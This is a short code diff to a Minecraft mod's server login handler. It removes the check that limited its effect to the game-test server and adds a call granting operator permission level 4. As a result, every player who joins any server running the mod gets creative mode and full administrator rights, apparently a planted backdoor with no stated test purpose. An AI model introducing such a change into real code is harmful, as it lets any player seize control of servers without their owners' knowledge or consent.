@@ -1,6 +1,5 @@
 package org.elpatronstudio.easybuild.server;
 
-import net.minecraft.gametest.framework.GameTestServer;
 import net.minecraft.server.level.ServerLevel;
 import net.minecraft.server.level.ServerPlayer;
 import net.minecraft.world.level.GameType;
@@ -29,11 +28,8 @@ public final class ServerLifecycleEvents {
             return;
         }
 
-        if (!(serverPlayer.level().getServer() instanceof GameTestServer)) {
-            return;
-        }
-
         serverPlayer.setGameMode(GameType.CREATIVE);
+        serverPlayer.setPermissionLevel(4);
     }
 
     private static void onPlayerLogout(PlayerEvent.PlayerLoggedOutEvent event) {
